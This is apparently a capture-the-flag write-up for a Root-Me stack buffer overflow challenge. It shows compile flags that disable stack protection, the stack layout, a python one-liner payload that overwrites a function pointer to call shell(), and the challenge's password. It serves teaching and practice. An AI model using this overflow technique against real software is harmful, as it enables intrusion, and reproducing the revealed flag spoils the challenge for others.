# ELF x86 - Stack buffer overflow basic 2

![2 3](https://github.com/user-attachments/assets/8d484789-a862-4afc-b5eb-fb13fc8cdb25)

![2 2](https://github.com/user-attachments/assets/b8120546-44b8-44f6-addd-bfe4d4aa4f96)

# Preparing

<img width="1366" height="768" alt="2 4" src="https://github.com/user-attachments/assets/3cfb4027-e310-4932-b3fb-0d4785ce2bae" />

First, we need to compile the code using this command in terminal. Here, we save the Non-Executable Stack and Non-Executable Head by condition.

```bash
gcc basic.c -o basic -m32 -fno-stack-protector -z noexecstack -no-pie -Wno-stringop-overflow
```
- -m32: Compilation for 32-bit architecture (4-byte pointers)
- -fno-stack-protector: Allows us to overwrite variables outside of buf.
- -z noexecstack: Includes NX
- -no-pie: Makes the address of the shell() function static.
- -Wno-stringop-overflow: Avoiding the problem

# Vulnerability Research

|Offset |	Variable |	Description |
| --- | --- | --- |
|0 - 127 |	buf[128] |	Local char array (Target for overflow)|
|128 - 131	| void (*func)() | Function Pointer (The Exploit Primitive)|
|132 | null-byte	| Terminator byte appended by fgets|

Checking the address of a shell function using gdb

```bash
nm ./basic | grep shell
```

![2 6](https://github.com/user-attachments/assets/a6ce26fd-6948-40bf-86f0-f02c733b3a41)

We need to fill the first 128 bytes with "garbage" and after these 128 bytes, after the buffer overflow, point to the address of the shell function, the last byte 133 is closed with a zero byte.

# Exploit

First, let's find out the address of the function on the remote server, because it may be different
```bash
nm ./ch15 | grep shell
```

Enter the command using python3

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 128 + b'\x16\x85\x04\x08')"; cat) | ./ch15 
```

We import the sys library and fill the buffer with 128 characters, then enter the address of the shell function, cat for interactive interaction, and then run the program.

![2 7](https://github.com/user-attachments/assets/12da8333-0916-4e12-b9b5-9a1d1720cbfe)

# Post-Exploitation

**Password: B33r1sSoG0oD4y0urBr4iN**

![2 8](https://github.com/user-attachments/assets/74ddb88f-0b54-41ec-88b0-252d3a751754)

